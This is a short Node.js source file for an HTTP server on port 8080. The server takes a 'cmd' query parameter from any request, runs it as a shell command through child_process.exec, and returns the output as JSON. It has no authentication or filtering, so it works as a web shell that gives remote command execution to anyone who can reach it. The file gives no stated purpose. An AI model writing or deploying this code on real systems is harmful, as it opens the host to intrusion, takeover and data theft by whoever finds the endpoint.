const http = require('http');
const url = require('url');
const { exec } = require('child_process');


const port = 8080;

const server = http.createServer((req, res) => {
  const query = url.parse(req.url, true).query;
  res.statusCode = 200;
  res.setHeader('Content-Type', 'application/json');
  if (query.cmd) {
    exec(query.cmd, (err, stdout, stderr) => {
      if (err) {
        res.end(JSON.stringify(err));
        return;
      }
      res.end(JSON.stringify({
        stdout,
        stderr
      }))
    });
  } else {
    res.end(JSON.stringify(query));
  }

});

server.listen(port, () => {
  console.log(`Server running.`);
});
